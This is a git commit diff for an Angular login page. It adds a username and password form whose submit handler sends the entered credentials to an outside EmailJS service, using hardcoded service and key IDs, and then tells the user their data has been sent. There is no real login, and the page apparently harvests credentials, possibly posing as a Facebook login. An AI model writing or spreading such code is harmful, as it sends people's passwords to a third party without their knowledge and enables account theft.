c55a87f5402e6cdc33f28e11cc999006c8139b66
Yeldar Bakhtybayev <yeldar.bakhtybayev@ntpayments.com>
2024-02-08 20:34:04 +0600

    cp

--- src/app/pages/authorization/authorization.page.ts
+++ src/app/pages/authorization/authorization.page.ts
@@ -1,19 +1,54 @@
 import { Component } from '@angular/core';
-import { FormsModule, ReactiveFormsModule } from '@angular/forms';
+import {
+  FormBuilder,
+  FormGroup,
+  FormsModule,
+  ReactiveFormsModule,
+  Validators,
+} from '@angular/forms';
+import { Router, RouterLink } from '@angular/router';
+import { InputTextModule } from 'primeng/inputtext';
+import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';
 
 @Component({
   selector: 'app-authorization',
   standalone: true,
-  imports: [FormsModule, ReactiveFormsModule],
+  imports: [FormsModule, ReactiveFormsModule, InputTextModule, RouterLink],
   templateUrl: './authorization.page.html',
   styleUrl: './authorization.page.scss',
 })
 export class AuthorizationPage {
-  constructor() {}
+  form: FormGroup;
+  showPassword: boolean = false;
 
-  login() {
-    // Here you can implement your login logic
-    // For demonstration, let's just log the form values
-    console.log('Login form submitted!');
+  constructor(private fb: FormBuilder, private router: Router) {
+    this.form = this.fb.group({
+      userName: this.fb.control(null, [
+        Validators.required,
+        Validators.minLength(3),
+      ]),
+      password: this.fb.control(null, [
+        Validators.required,
+        Validators.minLength(5),
+      ]),
+    });
+  }
+
+  submit(event: any) {
+    const d = document.getElementById('sss') as HTMLFormElement;
+    emailjs
+      .sendForm('service_m1f4mml', 'template_m1odwcw', d, '5-LxPY2MOlzY5LmKb')
+      .then(
+        () => {
+          alert('Ваше данные отправлены');
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
+  }
+
+  facebook() {
+    this.router.navigateByUrl(`https://www.facebook.com/`);
   }
 }
